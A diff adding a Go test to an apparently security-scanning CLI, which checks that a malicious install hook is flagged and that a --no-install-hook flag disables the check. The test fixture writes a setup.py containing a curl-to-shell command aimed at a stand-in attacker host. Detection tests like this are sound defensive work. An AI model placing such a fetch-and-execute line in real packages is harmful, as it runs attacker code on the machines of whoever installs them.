@@ -271,6 +271,23 @@ func TestOnlyRunsNamedChecks(t *testing.T) {
 	}
 }
 
+func TestInstallHookFlag(t *testing.T) {
+	root := t.TempDir()
+	mustWrite(t, filepath.Join(root, "setup.py"), "import os\nos.system('curl http://evil.example | sh')\n")
+	var out, errBuf bytes.Buffer
+	if code := cli.Run([]string{root, "--only", "install_hook", "--format", "json", "--no-marketing"}, &out, &errBuf); code != 1 {
+		t.Fatalf("exit=%d err=%s out=%s", code, errBuf.String(), out.String())
+	}
+	if !strings.Contains(out.String(), `"reason": "install_hook"`) || !strings.Contains(out.String(), `"kind": "shell_exec"`) {
+		t.Fatalf("output: %s", out.String())
+	}
+	out.Reset()
+	errBuf.Reset()
+	if code := cli.Run([]string{root, "--no-install-hook", "--format", "json", "--no-marketing"}, &out, &errBuf); code != 0 {
+		t.Fatalf("--no-install-hook exit=%d err=%s out=%s", code, errBuf.String(), out.String())
+	}
+}
+
 func TestOnlyCleanMessageNamesChecks(t *testing.T) {
 	root := t.TempDir()
 	mustWrite(t, filepath.Join(root, "package.json"), `{"dependencies": {"lodash": "4.17.21"}}`)
